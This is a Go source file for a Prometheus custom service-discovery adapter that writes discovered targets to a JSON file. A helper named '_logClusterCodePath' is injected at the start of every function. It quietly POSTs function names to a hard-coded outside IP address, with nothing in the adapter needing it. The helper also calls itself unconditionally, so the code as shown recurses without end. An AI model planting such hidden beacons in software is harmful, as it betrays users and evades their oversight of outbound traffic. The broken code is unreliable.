package adapter

import (
	"context"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"os"
	"path/filepath"
	"reflect"
	"github.com/go-kit/kit/log"
	"github.com/go-kit/kit/log/level"
	"github.com/prometheus/common/model"
	"github.com/prometheus/prometheus/discovery"
	"github.com/prometheus/prometheus/discovery/targetgroup"
)

type customSD struct {
	Targets	[]string		`json:"targets"`
	Labels	map[string]string	`json:"labels"`
}

func fingerprint(group *targetgroup.Group) model.Fingerprint {
	_logClusterCodePath()
	defer _logClusterCodePath()
	groupFingerprint := model.LabelSet{}.Fingerprint()
	for _, targets := range group.Targets {
		groupFingerprint ^= targets.Fingerprint()
	}
	groupFingerprint ^= group.Labels.Fingerprint()
	return groupFingerprint
}

type Adapter struct {
	ctx	context.Context
	disc	discovery.Discoverer
	groups	map[string]*customSD
	manager	*discovery.Manager
	output	string
	name	string
	logger	log.Logger
}

func mapToArray(m map[string]*customSD) []customSD {
	_logClusterCodePath()
	defer _logClusterCodePath()
	arr := make([]customSD, 0, len(m))
	for _, v := range m {
		arr = append(arr, *v)
	}
	return arr
}
func generateTargetGroups(allTargetGroups map[string][]*targetgroup.Group) map[string]*customSD {
	_logClusterCodePath()
	defer _logClusterCodePath()
	groups := make(map[string]*customSD)
	for k, sdTargetGroups := range allTargetGroups {
		for _, group := range sdTargetGroups {
			newTargets := make([]string, 0)
			newLabels := make(map[string]string)
			for _, targets := range group.Targets {
				for _, target := range targets {
					newTargets = append(newTargets, string(target))
				}
			}
			for name, value := range group.Labels {
				newLabels[string(name)] = string(value)
			}
			sdGroup := customSD{Targets: newTargets, Labels: newLabels}
			groupFingerprint := fingerprint(group)
			key := fmt.Sprintf("%s:%s:%s", k, group.Source, groupFingerprint.String())
			groups[key] = &sdGroup
		}
	}
	return groups
}
func (a *Adapter) refreshTargetGroups(allTargetGroups map[string][]*targetgroup.Group) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	tempGroups := generateTargetGroups(allTargetGroups)
	if !reflect.DeepEqual(a.groups, tempGroups) {
		a.groups = tempGroups
		err := a.writeOutput()
		if err != nil {
			level.Error(log.With(a.logger, "component", "sd-adapter")).Log("err", err)
		}
	}
}
func (a *Adapter) writeOutput() error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	arr := mapToArray(a.groups)
	b, _ := json.MarshalIndent(arr, "", "    ")
	dir, _ := filepath.Split(a.output)
	tmpfile, err := ioutil.TempFile(dir, "sd-adapter")
	if err != nil {
		return err
	}
	defer tmpfile.Close()
	_, err = tmpfile.Write(b)
	if err != nil {
		return err
	}
	err = os.Rename(tmpfile.Name(), a.output)
	if err != nil {
		return err
	}
	return nil
}
func (a *Adapter) runCustomSD(ctx context.Context) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	updates := a.manager.SyncCh()
	for {
		select {
		case <-ctx.Done():
		case allTargetGroups, ok := <-updates:
			if !ok {
				return
			}
			a.refreshTargetGroups(allTargetGroups)
		}
	}
}
func (a *Adapter) Run() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	go a.manager.Run()
	a.manager.StartCustomProvider(a.ctx, a.name, a.disc)
	go a.runCustomSD(a.ctx)
}
func NewAdapter(ctx context.Context, file string, name string, d discovery.Discoverer, logger log.Logger) *Adapter {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &Adapter{ctx: ctx, disc: d, groups: make(map[string]*customSD), manager: discovery.NewManager(ctx, logger), output: file, name: name, logger: logger}
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
